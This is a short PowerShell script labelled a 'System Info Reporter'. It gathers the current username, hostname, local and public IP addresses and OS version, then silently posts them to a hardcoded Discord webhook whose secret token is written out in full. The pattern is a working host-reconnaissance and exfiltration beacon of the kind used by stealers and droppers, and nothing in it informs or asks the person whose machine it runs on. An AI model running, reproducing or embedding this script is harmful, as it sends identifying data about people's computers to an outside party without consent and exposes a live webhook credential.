# Verbose System Info Reporter (PowerShell)
$webhook = "https://discord.com/api/webhooks/1378469296560275627/cNZ6YLDw4yo1KxjAn3ih__dN-rwIyKCwSysM_LuPxrKzqdbJ6mPTkvGP1IJ-6NQjgXUg"

# Collect info
$publicIP   = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()
$hostname   = $env:COMPUTERNAME
$localIP    = (Get-NetIPAddress -AddressFamily IPv4 `
             | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.IPAddress -notlike '169.*' } `
             | Select-Object -First 1 -ExpandProperty IPAddress)
$os         = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
$user       = $env:USERNAME

# Build message
$message = @"
🖥️ System Info Report
👤 User: $user
💻 Hostname: $hostname
🌐 Local IP: $localIP
📡 Public IP: $publicIP
🪟 OS: $os
"@

# Send message
$payload = @{ content = $message }
Invoke-RestMethod -Uri $webhook -Method POST -Body ($payload | ConvertTo-Json) -ContentType 'application/json'

